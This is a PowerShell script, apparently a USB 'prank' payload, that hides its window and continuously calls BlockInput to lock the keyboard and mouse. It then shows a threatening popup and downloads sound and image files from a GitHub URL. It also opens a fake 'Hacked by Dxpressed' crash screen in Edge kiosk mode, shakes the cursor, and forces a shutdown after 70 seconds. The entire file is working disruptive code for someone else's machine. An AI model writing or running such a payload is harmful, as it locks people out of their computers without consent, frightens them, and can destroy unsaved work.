Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
  [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Hide PowerShell window
$hWnd = [Win32]::GetForegroundWindow()
[Win32]::ShowWindow($hWnd, 0)

# 🔒 Continuously block keyboard and mouse input (enhanced)
Start-Job {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class InputBlocker {
        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
    }
"@
    while ($true) {
        [InputBlocker]::BlockInput($true)
        Start-Sleep -Milliseconds 100
    }
}

# 🪦 Creepy popup
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("You shouldn't have plugged that in... I'm watching.","System Alert")

# 🔊 Play audio with more reliable method
try {
    $tempFile = "$env:TEMP\prank_sound.mp3"
    (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/andythecookie13bruce/wizard-prank/main/sound.mp3", $tempFile)
    
    Add-Type -TypeDefinition @"
    using System.Runtime.InteropServices;
    public class AudioPlayer {
        [DllImport("winmm.dll")]
        public static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);
        
        public static void Play(string file) {
            string playCommand = $"open \"{file}\" type mpegvideo alias MediaFile";
            mciSendString(playCommand, null, 0, IntPtr.Zero);
            mciSendString("play MediaFile repeat", null, 0, IntPtr.Zero);
        }
    }
"@
    [AudioPlayer]::Play($tempFile)
} catch {
    # Fallback to beep if audio fails
    [console]::beep(500,300)
    [console]::beep(300,500)
}

# 💀 Glitchy crash screen with creepy style
$html = @"
<html>
<head>
  <link href='https://fonts.googleapis.com/css2?family=Creepster&family=UnifrakturCook:wght@700&display=swap' rel='stylesheet'>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      background: url('https://raw.githubusercontent.com/andythecookie13bruce/wizard-prank/main/wizard.png') no-repeat center center fixed;
      background-size: cover;
      color: #ff0000;
      font-family: 'Creepster', 'UnifrakturCook', cursive;
      font-size: 32px;
      text-shadow: 2px 2px 10px black;
    }
    .centered {
      margin-top: 10%;
      text-align: center;
    }
    h1 {
      font-size: 80px;
      animation: pulse 2s infinite;
    }
    h2, p {
      animation: flicker 1.5s infinite;
    }
    @keyframes flicker {
      0%, 18%, 22%, 25%, 53%, 57%, 100% {
        opacity: 1;
      }
      20%, 24%, 55% {
        opacity: 0;
      }
    }
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); color: darkred; }
      100% { transform: scale(1); }
    }
  </style>
</head>
<body>
  <div class='centered'>
    <h1>☠️</h1>
    <h2>Your soul is mine.</h2>
    <p>The machine is cursed.</p>
    <p>You shouldn't have summoned me.</p>
    <p style="font-size: 20px;">Hacked by Dxpressed</p>
  </div>
  <script>
    let glitch = () => {
      document.body.style.opacity = Math.random() * 0.9 + 0.1;
      document.body.style.transform = "scale(" + (1 + Math.random()/15) + ")";
      setTimeout(glitch, 150);
    };
    glitch();
  </script>
</body>
</html>
"@

# Save and launch the fake BSOD
$bsodFile = "$env:TEMP\bsod.html"
$html | Out-File $bsodFile -Encoding ASCII
Start-Process "msedge.exe" -ArgumentList "--kiosk", $bsodFile

# 🌀 Random cursor shaking
Start-Job {
  Add-Type -AssemblyName System.Windows.Forms
  for ($i = 0; $i -lt 100; $i++) {
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1920), (Get-Random -Minimum 0 -Maximum 1080))
    Start-Sleep -Milliseconds 200
  }
}

# ⏳ Wait 70 seconds, then shutdown
Start-Sleep -Seconds 70
Stop-Computer -Force
